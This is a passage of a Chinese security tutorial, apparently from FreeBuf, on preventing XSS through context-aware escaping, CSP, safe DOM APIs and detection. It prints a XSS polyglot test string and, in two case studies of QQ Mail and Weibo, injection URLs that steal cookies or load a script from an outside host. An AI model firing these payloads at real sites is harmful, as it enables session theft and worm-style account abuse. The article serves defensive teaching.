转义，并不等于高枕无忧。</p><p>2.对于链接跳转，如 <code>&amp;lt;a href="xxx"</code> 或 <code>location.href="xxx"</code>，要检验其内容，禁止以 <code>javascript:</code> 开头的链接，和其他非法的 scheme。</p><h3> 根据上下文采用不同的转义规则 </h3><p>某天，小明为了加快网页的加载速度，把一个数据通过 JSON 的方式内联到 HTML 中：</p><pre><code>&lt; script &gt;  <br> var &nbsp;initData&nbsp;=&nbsp;  &lt; %= &nbsp; data.toJSON ()&nbsp;%&gt; <br>&lt;/ script &gt; <br></code></pre><p>插入 JSON 的地方不能使用 <code>escapeHTML()</code>，因为转义 <code>"</code> 后，JSON 格式会被破坏。</p><p>但安全组又发现有漏洞，原来这样内联 JSON 也是不安全的：</p><p>1.当 JSON 中包含 <code>U+2028</code> 或 <code>U+2029</code> 这两个字符时，不能作为 JavaScript 的字面量使用，否则会抛出语法错误。</p><p>2.当 JSON 中包含字符串 时，当前的 script 标签将会被闭合，后面的字符串内容浏览器会按照 HTML 进行解析；通过增加下一个&nbsp;<code>&lt;script&gt;</code> 标签等方法就可以完成注入。</p><p>于是我们又要实现一个 <code>escapeEmbedJSON()</code> 函数，对内联 JSON 进行转义。</p><p>转义规则如下：</p><p>|字符|转义后的字符|    <br>|-|-|    <br>|<code>U+2028</code>|<code>\\u2028</code>|    <br>|<code>U+2029</code>|<code>\\u2029</code>|    <br>|<code>&lt;</code>|<code>\\u003c</code>|</p><p>修复后的代码如下：</p><pre><code> &lt; script &gt;  <br> var &nbsp;initData&nbsp;=&nbsp;  &lt; %= &nbsp; escapeEmbedJSON ( data.toJSON ())&nbsp;%&gt; <br></code></pre><p>通过这个事件，小明学习到了如下知识：</p><p>1.HTML 转义是非常复杂的，在不同的情况下要采用不同的转义规则。如果采用了错误的转义规则，很有可能会埋下 XSS 隐患。</p><p>2.应当尽量避免自己写转义库，而应当采用成熟的、业界通用的转义库。</p><h3> 漏洞总结 </h3><p>小明的例子讲完了，下面我们来系统的看下 XSS 有哪些注入的方法：</p><blockquote><p>在 HTML 中内嵌的文本中，恶意内容以 script 标签形成注入。</p><p>在内联的 JavaScript 中，拼接的数据突破了原本的限制（字符串，变量，方法名等）。</p><p>在标签属性中，恶意内容包含引号，从而突破属性值的限制，注入其他属性或者标签。</p><p>在标签的 href、src 等属性中，包含 <code>javascript:</code> 等可执行代码。</p><p>在 onload、onerror、onclick 等事件中，注入不受控制代码。</p><p>在 style 属性和标签中，包含类似 <code>background-image:url("javascript:…");</code> 的代码（新版本浏览器已经可以防范）。</p><p>在 style 属性和标签中，包含类似 <code>expression(…)</code> 的 CSS 表达式代码（新版本浏览器已经可以防范）。</p></blockquote><p>总之，如果开发者没有将用户输入的文本进行合适的过滤，就贸然插入到 HTML 中，这很容易造成注入漏洞。攻击者可以利用漏洞，构造出恶意的代码指令，进而利用恶意代码危害数据安全。</p><h2> XSS 攻击的分类 </h2><p>通过上述几个例子，我们已经对 XSS 有了一些认识。</p><h3> 什么是 XSS </h3><p>Cross-Site Scripting（跨站脚本攻击）简称 XSS，是一种代码注入攻击。攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。</p><p>为了和 CSS 区分，这里把攻击的第一个字母改成了 X，于是叫做 XSS。</p><p>XSS 的本质是：恶意代码未经过滤，与网站正常的代码混在一起；浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行。</p><p>而由于直接在用户的终端执行，恶意代码能够直接获取用户的信息，或者利用这些信息冒充用户向网站发起攻击者定义的请求。</p><p>在部分情况下，由于输入的限制，注入的恶意脚本比较短。但可以通过引入外部的脚本，并由浏览器执行，来完成比较复杂的攻击策略。</p><p>这里有一个问题：用户是通过哪种方法“注入”恶意脚本的呢？</p><p>不仅仅是业务上的“用户的 UGC 内容”可以进行注入，包括 URL 上的参数等都可以是攻击的来源。在处理输入时，以下内容都不可信：</p><blockquote><p>来自用户的 UGC 信息</p><p>来自第三方的链接</p><p>URL 参数</p><p>POST 参数</p><p>Referer （可能来自不可信的来源）</p><p>Cookie （可能来自其他子域注入）</p></blockquote><h3> XSS 分类 </h3><p>根据攻击的来源，XSS 攻击可分为存储型、反射型和 DOM 型三种。</p><p>|类型|存储区|插入点|    <br>|-|-|    <br>|存储型 XSS|后端数据库|HTML|    <br>|反射型 XSS|URL|HTML|    <br>|DOM 型 XSS|后端数据库/前端存储/URL|前端 JavaScript|</p><p>存储区：恶意代码存放的位置。</p><p>插入点：由谁取得恶意代码，并插入到网页上。</p><h3> 存储型 XSS </h3><p>存储型 XSS 的攻击步骤：</p><p>1.攻击者将恶意代码提交到目标网站的数据库中。</p><p>2.用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。</p><p>3.用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。</p><p>4.恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</p><p>这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。</p><h3> 反射型 XSS </h3><p>反射型 XSS 的攻击步骤：</p><p>1.攻击者构造出特殊的 URL，其中包含恶意代码。</p><p>2.用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。</p><p>3.用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。</p><p>4.恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</p><p>反射型 XSS 跟存储型 XSS 的区别是：存储型 XSS 的恶意代码存在数据库里，反射型 XSS 的恶意代码存在 URL 里。</p><p>反射型 XSS 漏洞常见于通过 URL 传递参数的功能，如网站搜索、跳转等。</p><p>由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。</p><p>POST 的内容也可以触发反射型 XSS，只不过其触发条件比较苛刻（需要构造表单提交页面，并引导用户点击），所以非常少见。</p><h3> DOM 型 XSS </h3><p>DOM 型 XSS 的攻击步骤：</p><p>1.攻击者构造出特殊的 URL，其中包含恶意代码。</p><p>2.用户打开带有恶意代码的 URL。</p><p>3.用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。</p><p>4.恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</p><p>DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。</p><h2> XSS 攻击的预防 </h2><p>通过前面的介绍可以得知，XSS 攻击有两大要素：</p><p>1.攻击者提交恶意代码。</p><p>2.浏览器执行恶意代码。</p><p>针对第一个要素：我们是否能够在用户输入的过程，过滤掉用户输入的恶意代码呢？</p><h3> 输入过滤 </h3><p>在用户提交时，由前端过滤输入，然后提交到后端。这样做是否可行呢？</p><p>答案是不可行。一旦攻击者绕过前端过滤，直接构造请求，就可以提交恶意代码了。</p><p>那么，换一个过滤时机：后端在写入数据库前，对输入进行过滤，然后把“安全的”内容，返回给前端。这样是否可行呢？</p><p>我们举一个例子，一个正常的用户输入了 <code>5 &lt; 7</code> 这个内容，在写入数据库前，被转义，变成了 <code>5 &amp;lt; 7</code>。</p><p>问题是：在提交阶段，我们并不确定内容要输出到哪里。</p><p>这里的“并不确定内容要输出到哪里”有两层含义：</p><p>1.用户的输入内容可能同时提供给前端和客户端，而一旦经过了<code>escapeHTML()</code>，客户端显示的内容就变成了乱码( <code>5 &amp;lt; 7</code> )。</p><p>2.在前端中，不同的位置所需的编码也不同。</p><p>当 <code>5 &amp;lt; 7</code> 作为 HTML 拼接页面时，可以正常显示：<span style="font-size: 13px;">&lt; div &nbsp; title = "comment" &gt; 5&nbsp;&amp;lt;&nbsp;7 &lt;/ div &gt;。</span></p><p>当 <code>5 &amp;lt; 7</code> 通过 Ajax 返回，然后赋值给 JavaScript 的变量时，前端得到的字符串就是转义后的字符。这个内容不能直接用于 Vue 等模板的展示，也不能直接用于内容长度计算。不能用于标题、alert 等。</p><p>所以，输入侧过滤能够在某些情况下解决特定的 XSS 问题，但会引入很大的不确定性和乱码问题。在防范 XSS 攻击时应避免此类方法。</p><p>当然，对于明确的输入类型，例如数字、URL、电话号码、邮件地址等等内容，进行输入过滤还是必要的。</p><p>既然输入过滤并非完全可靠，我们就要通过“防止浏览器执行恶意代码”来防范 XSS。这部分分为两类：</p><p>1.防止 HTML 中出现注入。</p><p>2.防止 JavaScript 执行时，执行恶意代码。</p><h3> 预防存储型和反射型 XSS 攻击 </h3><p>存储型和反射型 XSS 都是在服务端取出恶意代码后，插入到响应 HTML 里的，攻击者刻意编写的“数据”被内嵌到“代码”中，被浏览器所执行。</p><p>预防这两种漏洞，有两种常见做法：</p><p>1.改成纯前端渲染，把代码和数据分隔开。</p><p>2.对 HTML 做充分转义。</p><h3> 纯前端渲染 </h3><p>纯前端渲染的过程：</p><p>1.浏览器先加载一个静态 HTML，此 HTML 中不包含任何跟业务相关的数据。</p><p>2.然后浏览器执行 HTML 中的 JavaScript。</p><p>3.JavaScript 通过 Ajax 加载业务数据，调用 DOM API 更新到页面上。</p><p>在纯前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本（<code>.innerText</code>），还是属性（<code>.setAttribute</code>），还是样式（<code>.style</code>）等等。浏览器不会被轻易的被欺骗，执行预期外的代码了。</p><p>但纯前端渲染还需注意避免 DOM 型 XSS 漏洞（例如 <code>onload</code> 事件和 <code>href</code> 中的 <code>javascript:xxx</code> 等，请参考下文”预防 DOM 型 XSS 攻击“部分）。</p><p>在很多内部、管理系统中，采用纯前端渲染是非常合适的。但对于性能要求高，或有 SEO 需求的页面，我们仍然要面对拼接 HTML 的问题。</p><h3> 转义 HTML </h3><p>如果拼接 HTML 是必要的，就需要采用合适的转义库，对 HTML 模板各处插入点进行充分的转义。</p><p>常用的模板引擎，如 doT.js、ejs、FreeMarker 等，对于 HTML 转义通常只有一个规则，就是把 <code>&amp; &lt; &gt; " \' /</code> 这几个字符转义掉，确实能起到一定的 XSS 防护作用，但并不完善：</p><p>|XSS 安全漏洞|简单转义是否有防护作用|    <br>|-|-|    <br>|HTML 标签文字内容|有|    <br>|HTML 属性值|有|    <br>|CSS 内联样式|无|    <br>|内联 JavaScript|无|    <br>|内联 JSON|无|    <br>|跳转链接|无|</p><p>所以要完善 XSS 防护措施，我们要使用更完善更细致的转义策略。</p><p>例如 Java 工程里，常用的转义库为 <code>org.owasp.encoder</code>。以下代码引用自 org.owasp.encoder 的官方说明。</p><pre><code> &lt;!--&nbsp;HTML&nbsp;标签内文字内容&nbsp;--&gt; <br> &lt; div &gt;  &lt; %= &nbsp; Encode.forHtml ( UNTRUSTED )&nbsp;%&gt;  &lt;/ div &gt; <br><br> &lt;!--&nbsp;HTML&nbsp;标签属性值&nbsp;--&gt; <br> &lt; input &nbsp; value = "&lt;%=&nbsp;Encode.forHtml(UNTRUSTED)&nbsp;%&gt;" &nbsp;/&gt; <br><br> &lt;!--&nbsp;CSS&nbsp;属性值&nbsp;--&gt; <br> &lt; div &nbsp; style = "width:&lt;=&nbsp;Encode.forCssString(UNTRUSTED)&nbsp;%&gt;" &gt; <br><br> &lt;!--&nbsp;CSS&nbsp;URL&nbsp;--&gt; <br> &lt; div &nbsp; style = "background:&lt;=&nbsp;Encode.forCssUrl(UNTRUSTED)&nbsp;%&gt;" &gt; <br><br> &lt;!--&nbsp;JavaScript&nbsp;内联代码块&nbsp;--&gt; <br> &lt; script &gt;  <br>&nbsp;&nbsp; var &nbsp;msg&nbsp;=&nbsp; "&lt;%=&nbsp;Encode.forJavaScript(UNTRUSTED)&nbsp;%&gt;" ;<br>&nbsp;&nbsp;alert(msg);<br>  &lt;/ script &gt; <br> &lt;!--&nbsp;JavaScript&nbsp;内联代码块内嵌&nbsp;JSON&nbsp;--&gt; <br> &lt; script &gt;  <br> var &nbsp;__INITIAL_STATE__&nbsp;=&nbsp; JSON .parse( \'&lt;%=&nbsp;Encoder.forJavaScript(data.to_json)&nbsp;%&gt;\' );<br>  &lt;/ script &gt; <br> &lt;!--&nbsp;HTML&nbsp;标签内联监听器&nbsp;--&gt; <br> &lt; button <br>&nbsp;&nbsp; onclick = "alert(\'&lt;%=&nbsp;Encode.forJavaScript(UNTRUSTED)&nbsp;%&gt;\');" &gt; <br>&nbsp;&nbsp;click&nbsp;me<br> &lt;/ button &gt; <br> &lt;!--&nbsp;URL&nbsp;参数&nbsp;--&gt; <br> &lt; a &nbsp; href = "/search?value=&lt;%=&nbsp;Encode.forUriComponent(UNTRUSTED)&nbsp;%&gt;&amp;order=1#top" &gt; <br> &lt;!--&nbsp;URL&nbsp;路径&nbsp;--&gt; <br> &lt; a &nbsp; href = "/page/&lt;%=&nbsp;Encode.forUriComponent(UNTRUSTED)&nbsp;%&gt;" &gt; <br> &lt;!--<br>&nbsp;&nbsp;URL.<br>&nbsp;&nbsp;注意：要根据项目情况进行过滤，禁止掉&nbsp;"javascript:"&nbsp;链接、非法&nbsp;scheme&nbsp;等<br>--&gt; <br> &lt; a &nbsp; href = \'&lt;%=<br>&nbsp;&nbsp;urlValidator.isValid(UNTRUSTED)&nbsp;?<br>&nbsp;&nbsp;&nbsp;&nbsp;Encode.forHtml(UNTRUSTED)&nbsp;:<br>&nbsp;&nbsp;&nbsp;&nbsp;"/404"<br>%&gt;\' &gt; <br>&nbsp;&nbsp;link<br> &lt;/ a &gt; <br></code></pre><p>可见，HTML 的编码是十分复杂的，在不同的上下文里要使用相应的转义规则。</p><h3> 预防 DOM 型 XSS 攻击 </h3><p>DOM 型 XSS 攻击，实际上就是网站前端 JavaScript 代码本身不够严谨，把不可信的数据当作代码执行了。</p><p>在使用 <code>.innerHTML</code>、<code>.outerHTML</code>、<code>document.write()</code> 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 <code>.textContent</code>、<code>.setAttribute()</code> 等。</p><p>如果用 Vue/React 技术栈，并且不使用 <code>v-html</code>/<code>dangerouslySetInnerHTML</code> 功能，就在前端 render 阶段避免 <code>innerHTML</code>、<code>outerHTML</code> 的 XSS 隐患。</p><p>DOM 中的内联事件监听器，如 <code>location</code>、<code>onclick</code>、<code>onerror</code>、<code>onload</code>、<code>onmouseover</code> 等，<code>&lt;a&gt;</code> 标签的 <code>href</code> 属性，JavaScript 的 <code>eval()</code>、<code>setTimeout()</code>、<code>setInterval()</code>    等，都能把字符串作为代码运行。如果不可信的数据拼接到字符串中传递给这些 API，很容易产生安全隐患，请务必避免。</p><pre><code> &lt;!--&nbsp;内联事件监听器中包含恶意代码&nbsp;--&gt; <br> &lt; img &nbsp; onclick = "UNTRUSTED" &nbsp; onerror = "UNTRUSTED" &nbsp; src = "data:image/png," &gt; <br> &lt;!--&nbsp;链接内包含恶意代码&nbsp;--&gt; <br> &lt; a &nbsp; href = "UNTRUSTED" &gt; 1 &lt;/ a &gt; <br> &lt; script &gt;  <br> //&nbsp;setTimeout()/setInterval()&nbsp;中调用恶意代码 <br>setTimeout( "UNTRUSTED" )<br>setInterval( "UNTRUSTED" )<br> //&nbsp;location&nbsp;调用恶意代码 <br>location.href&nbsp;=&nbsp; \'UNTRUSTED\' <br> //&nbsp;eval()&nbsp;中调用恶意代码 <br> eval ( "UNTRUSTED" )<br>  &lt;/ script &gt; <br></code></pre><p>如果项目中有用到这些的话，一定要避免在字符串中拼接不可信数据。</p><h2> 其他 XSS 防范措施 </h2><p>虽然在渲染页面和执行 JavaScript 时，通过谨慎的转义可以防止 XSS 的发生，但完全依靠开发的谨慎仍然是不够的。以下介绍一些通用的方案，可以降低 XSS 带来的风险和后果。</p><h3> Content Security Policy </h3><p>严格的 CSP 在 XSS 的防范中可以起到以下的作用：</p><blockquote><p>禁止加载外域代码，防止复杂的攻击逻辑。</p><p>禁止外域提交，网站被攻击后，用户的数据不会泄露到外域。</p><p>禁止内联脚本执行（规则较严格，目前发现 GitHub 使用）。</p><p>禁止未授权的脚本执行（新特性，Google Map 移动版在使用）。</p><p>合理使用上报可以及时发现 XSS，利于尽快修复问题。</p></blockquote><p>关于 CSP 的详情，请关注前端安全系列后续的文章。</p><h3> 输入内容长度控制 </h3><p>对于不受信任的输入，都应该限定一个合理的长度。虽然无法完全防止 XSS 发生，但可以增加 XSS 攻击的难度。</p><h3> 其他安全措施</h3><p>HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie，攻击者完成 XSS 注入后也无法窃取此 Cookie。</p><p>验证码：防止脚本冒充用户提交危险操作。</p><h2> XSS 的检测 </h2><p>上述经历让小明收获颇丰，他也学会了如何去预防和修复 XSS 漏洞，在日常开发中也具备了相关的安全意识。但对于已经上线的代码，如何去检测其中有没有 XSS 漏洞呢？</p><p>经过一番搜索，小明找到了两个方法：</p><p>1.使用通用 XSS 攻击字符串手动检测 XSS 漏洞。</p><p>2.使用扫描工具自动检测 XSS 漏洞。</p><p>在<a href="https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot" ref="">Unleashing an Ultimate XSS Polyglot</a>一文中，小明发现了这么一个字符串：</p><pre><code>jaVasCript: /*-/*`/*\\`/*\'/*"/**/ ( /*&nbsp;*/ oNcliCk=alert()&nbsp;) //%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\\x3e <br></code></pre><p>它能够检测到存在于 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等多种上下文中的 XSS 漏洞，也能检测 <code>eval()</code>、<code>setTimeout()</code>、<code>setInterval()</code>、<code>Function()</code>、<code>innerHTML</code>、<code>document.write()</code> 等 DOM 型 XSS    漏洞，并且能绕过一些 XSS 过滤器。</p><p>小明只要在网站的各输入框中提交这个字符串，或者把它拼接到 URL 参数上，就可以进行检测了。</p><pre><code>http ://xxx/search?keyword=jaVasCript %3 A %2 F*- %2 F* %60  %2 F* %60  %2 F* %27  %2 F* %22  %2 F** %2 F( %2 F* %20 * %2 FoNcliCk %3 Dalert() %20 ) %2 F %2 F %250 D %250 A %250 d %250 a %2 F %2 F %3 C %2 FstYle %2 F %3 C %2 FtitLe %2 F %3 C %2 FteXtarEa %2 F %3 C %2 FscRipt %2 F--! %3 E %3 CsVg %2 F %3 CsVg %2 FoNloAd %3 Dalert() %2 F %2 F %3 E %3 E<br></code></pre><p>除了手动检测之外，还可以使用自动扫描工具寻找 XSS 漏洞，例如 <a href="https://github.com/Arachni/arachni">Arachni</a>、<a href="https://github.com/mozilla/http-observatory/">Mozilla HTTP Observatory</a>、<a href="https://github.com/andresriancho/w3af">w3af</a> 等。</p><h2> XSS 攻击的总结 </h2><p>我们回到最开始提出的问题，相信同学们已经有了答案：</p><p>1.XSS 防范是后端 RD 的责任，后端 RD 应该在所有用户提交数据的接口，对敏感字符进行转义，才能进行下一步操作。</p><p>不正确。因为：</p><blockquote><p>防范存储型和反射型 XSS 是后端 RD 的责任。而 DOM 型 XSS 攻击不发生在后端，是前端 RD 的责任。防范 XSS 是需要后端 RD 和前端 RD 共同参与的系统工程。</p><p>转义应该在输出 HTML 时进行，而不是在提交用户输入时。</p></blockquote><p>2.所有要插入到页面上的数据，都要通过一个敏感字符过滤函数的转义，过滤掉通用的敏感字符后，就可以插入到页面中。</p><blockquote>    <p>不正确。        <br>不同的上下文，如 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等，所需要的转义规则不一致。        <br>业务 RD 需要选取合适的转义库，并针对不同的上下文调用不同的转义规则。</p></blockquote><p>整体的 XSS 防范是非常复杂和繁琐的，我们不仅需要在全部需要转义的位置，对数据进行对应的转义。而且要防止多余和错误的转义，避免正常的用户输入出现乱码。</p><p>虽然很难通过技术手段完全避免 XSS，但我们可以总结以下原则减少漏洞的产生：</p><p><strong style="color: inherit;">利用模板引擎</strong></p><p>开启模板引擎自带的 HTML 转义功能。例如：&nbsp;</p><blockquote><p>在 ejs 中，尽量使用 <code>&lt;%= data %&gt;</code> 而不是 <code>&lt;%- data %&gt;</code>；&nbsp;</p><p>在 doT.js 中，尽量使用 <code>{{! data }</code> 而不是 <code>{{= data }</code>；&nbsp;</p><p>在 FreeMarker 中，确保引擎版本高于 2.3.24，并且选择正确的 <code>freemarker.core.OutputFormat</code>。</p></blockquote><p><strong>避免内联事件</strong></p><p>尽量不要使用 <code>onLoad="onload(\'{{data}}\')"</code>、<code>onClick="go(\'{{action}}\')"</code> 这种拼接内联事件的写法。在 JavaScript 中通过 <code>.addEventlistener()</code> 事件绑定会更安全。</p><p><strong style="color: inherit;">避免拼接 HTML</strong></p><p>前端采用拼接 HTML 的方法比较危险，如果框架允许，使用 <code>createElement</code>、<code>setAttribute</code> 之类的方法实现。或者采用比较成熟的渲染框架，如 Vue/React 等。</p><p><strong style="color: inherit;">时刻保持警惕</strong></p><p>在插入位置为 DOM 属性、链接等位置时，要打起精神，严加防范。</p><p><strong style="color: inherit;">增加攻击难度，降低攻击后果</strong></p><p>通过 CSP、输入长度配置、接口安全措施等方法，增加攻击的难度，降低攻击的后果。</p><p><strong style="color: inherit;">主动检测和发现</strong></p><p>可使用 XSS 攻击字符串和自动扫描工具寻找潜在的 XSS 漏洞。</p><h2> XSS 攻击案例 </h2><h3> QQ 邮箱 m.exmail.qq.com 域名反射型 XSS 漏洞 </h3><p>攻击者发现 <code><a href="http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&amp;domain=bbbb">http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&amp;domain=bbbb</a></code> 这个 URL 的参数 <code>uin</code>、<code>domain</code> 未经转义直接输出到 HTML 中。</p><p>于是攻击者构建出一个 URL，并引导用户去点击：    <br><code><a href="http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&amp;domain=bbbb%26quot%3B%3Breturn+false%3B%26quot%3B%26lt%3B%2Fscript%26gt%3B%26lt%3Bscript%26gt%3Balert">http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&amp;domain=bbbb%26quot%3B%3Breturn+false%3B%26quot%3B%26lt%3B%2Fscript%26gt%3B%26lt%3Bscript%26gt%3Balert</a>(document.cookie)%26lt%3B%2Fscript%26gt%3B</code></p><p>用户点击这个 URL 时，服务端取出 URL 参数，拼接到 HTML 响应中：</p><pre><code> &lt;script&gt;  <br>getTop().location.href= "/cgi-bin/loginpage?autologin=n&amp;errtype=1&amp;verify=&amp;clientuin=aaa" + "&amp;t=" + "&amp;d=bbbb" ; return &nbsp; false ;  &lt;/ script &gt;  &lt; script &gt;  alert( document .cookie)  &lt;/ script &gt; "+"...<br></code></pre><p>浏览器接收到响应后就会执行 <code>alert(document.cookie)</code>，攻击者通过 JavaScript 即可窃取当前用户在 QQ 邮箱域名下的 Cookie ，进而危害数据安全。</p><h3> 新浪微博名人堂反射型 XSS 漏洞 </h3><p>攻击者发现 <code><a href="http://weibo.com/pub/star/g/xyyyd">http://weibo.com/pub/star/g/xyyyd</a></code> 这个 URL 的内容未经过滤直接输出到 HTML 中。</p><p>于是攻击者构建出一个 URL，然后诱导用户去点击：</p><p><code><a href="http://weibo.com/pub/star/g/xyyyd">http://weibo.com/pub/star/g/xyyyd</a>"&gt;&lt;script src=//xxxx.cn/image/t.js&gt;&lt;/script&gt;</code></p><p>用户点击这个 URL 时，服务端取出请求 URL，拼接到 HTML 响应中：</p><pre><code> &lt;li&gt;  &lt;a href = "http://weibo.com/pub/star/g/xyyyd" &gt;  &lt; script &nbsp; src = //xxxx.cn/image/t.js &gt;  &lt;/ script &gt; "&gt;按分类检索 &lt;/ a &gt;  &lt;/ li &gt; <br></code></pre><p>浏览器接收到响应后就会加载执行恶意脚本 <code>//xxxx.cn/image/t.js</code>，在恶意脚本中利用用户的登录状态进行关注、发微博、发私信等操作，发出的微博和私信可再带上攻击 URL，诱导更多人点击，不断放大攻击范围。这种窃用受害者身份发布恶意内容，层层放大攻击范围的方式，被称为“XSS 蠕虫”。</p><h2> 扩展阅读：Automatic Context-Aware Escaping </h2><p>上文我们说到：</p><p>1.合适的 HTML 转义可以有效避免 XSS 漏洞。</p><p>2.完善的转义库需要针对上下文制定多种规则，例如 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等等。</p><p>3.业务 RD 需要根据每个插入点所处的上下文，选取不同的转义规则。</p><p>通常，转义库是不能判断插入点上下文的（Not Context-Aware），实施转义规则的责任就落到了业务 RD 身上，需要每个业务 RD 都充分理解 XSS 的各种情况，并且需要保证每一个插入点使用了正确的转义规则。</p><p>这种机制工作量大，全靠人工保证，很容易造成 XSS 漏洞，安全人员也很难发现隐患。</p><p>2009年，Google 提出了一个概念叫做：<a href="https://security.googleblog.com/2009/03/reducing-xss-by-way-of-automatic.html">Automatic Context-Aware Escaping</a>。</p><p>所谓 Context-Aware，就是说模板引擎在解析模板字符串的时候，就解析模板语法，分析出每个插入点所处的上下文，据此自动选用不同的转义规则。这样就减轻了业务 RD 的工作负担，也减少了人为带来的疏漏。</p><p>在一个支持 Automatic Context-Aware Escaping 的模板引擎里，业务 RD 可以这样定义模板，而无需手动实施转义规则：</p><pre><code> &lt; html &gt; <br>&nbsp;&nbsp; &lt; head &gt; <br>&nbsp;&nbsp;&nbsp;&nbsp; &lt; meta &nbsp; charset = "UTF-8" &gt; <br>&nbsp;&nbsp;&nbsp;&nbsp; &lt; title &gt; {{.title}} &lt;/ title &gt; <br>&nbsp;&nbsp; &lt;/ head &gt; <br>&nbsp;&nbsp; &lt; body &gt; <br>&nbsp;&nbsp;&nbsp;&nbsp; &lt; a &nbsp; href = "{{.url}}" &gt; {{.content}} &lt;/ a &gt; <br>&nbsp;&nbsp; &lt;/ body &gt; <br> &lt;/ html &gt; <br></code></pre><p>模板引擎经过解析后，得知三个插入点所处的上下文，自动选用相应的转义规则：</p><pre><code> &lt; html &gt; <br>&nbsp;&nbsp; &lt; head &gt; <br>&nbsp;&nbsp;&nbsp;&nbsp; &lt; meta &nbsp; charset = "UTF-8" &gt; <br>&nbsp;&nbsp;&nbsp;&nbsp; &lt; title &gt; {{.title&nbsp;|&nbsp;htmlescaper}} &lt;/ title &gt; <br>&nbsp;&nbsp; &lt;/ head &gt; <br>&nbsp;&nbsp; &lt; body &gt; <br>&nbsp;&nbsp;&nbsp;&nbsp; &lt; a &nbsp; href = "{{.url&nbsp;|&nbsp;urlescaper&nbsp;|&nbsp;attrescaper}}" &gt; {{.content&nbsp;|&nbsp;htmlescaper}} &lt;/ a &gt; <br>&nbsp;&nbsp; &lt;/ body &gt; <br> &lt;/ html &gt; <br></code></pre><p>目前已经支持 Automatic Context-Aware Escaping 的模板引擎有：</p><p>1.<a href="https://golang.org/pkg/html/template/">go html/template</a></p><p>2.<a href="https://developers.google.com/closure/templates/docs/security">Google Closure Templates</a></p><h2> 课后作业：XSS 攻击小游戏 </h2><p>以下是几个 XSS 攻击小游戏，开发者在网站上故意留下了一些常见的 XSS 漏洞。玩家在网页上提交相应的输入，完成 XSS 攻击即可通关。</p><p>在玩游戏的过程中，请各位读者仔细思考和回顾本文内容，加深对 XSS 攻击的理解。</p><p><a href="https://alf.nu/alert1">alert(1) to win</a>    <br><a href="http://prompt.ml/">prompt(1) to win</a>    <br><a href="https://xss-game.appspot.com/">XSS game</a></p><h2> 参考文献</h2><p>Wikipedia. <a href="https://en.wikipedia.org/wiki/Cross-site_scripting">Cross-site scripting</a><span style="color: rgb(51, 51, 51); font-size: 16px;">, Wikipedia.</span></p><p>OWASP. <a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet">XSS (Cross Site Scripting) Prevention Cheat Sheet</a><span style="color: rgb(51, 51, 51); font-size: 16px;">, OWASP.</span></p><p>OWASP. <a href="https://github.com/OWASP/owasp-java-encoder/wiki/2">Use the OWASP Java Encoder</a><span style="color: rgb(51, 51, 51); font-size: 16px;">-Use-the-OWASP-Java-Encoder), GitHub.</span></p><p>Ahmed Elsobky. <a href="https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot">Unleashing an Ultimate XSS Polyglot</a><span style="color: rgb(51, 51, 51); font-size: 16px;">, GitHub.</span></p><p>Jad S. Boutros. <a href="https://security.googleblog.com/2009/03/reducing-xss-by-way-of-automatic.html">Reducing XSS by way of Automatic Context-Aware Escaping in Template Systems</a><span style="color: rgb(51, 51, 51); font-size: 16px;">, Google Security Blog.</span></p><p>Vue.js. <a href="https://vuejs.org/v2/api/#v-html">v-html - Vue API docs</a><span style="color: rgb(51, 51, 51); font-size: 16px;">, Vue.js.</span></p><p>React. <a href="https://reactjs.org/docs/dom-elements.html#dangerouslysetinnerhtml">dangerouslySetInnerHTML - DOM Elements</a><span style="color: rgb(51, 51, 51); font-size: 16px;">, React.</span></p><h2> 下期预告 </h2><p>前端安全系列文章将对 XSS、CSRF、网络劫持、Hybrid 安全等安全议题展开论述。下期我们要讨论的是 CSRF 攻击，敬请关注。</p><p><b style="color: rgb(159, 163, 168);">*本文作者：李阳，转载请注明来自FreeBuf.COM</b></p>',is_original:p,is_reward:p,is_reproduce:p,post_list:[]},serverMemuRender:p}],fetch:[],error:null,state:{counter:0,userInfo:{userInfo:{},skinData:{skin:"classical",vip:p,vip_time:""},dynamicCount:"",columnNumber:"",keyAuth:"",messageCount:{},isParty:p,guestRemind:p}},serverRendered:!0,routePath:"/articles/web/185654.html"}}(!1,"美团技术团队")</script><script 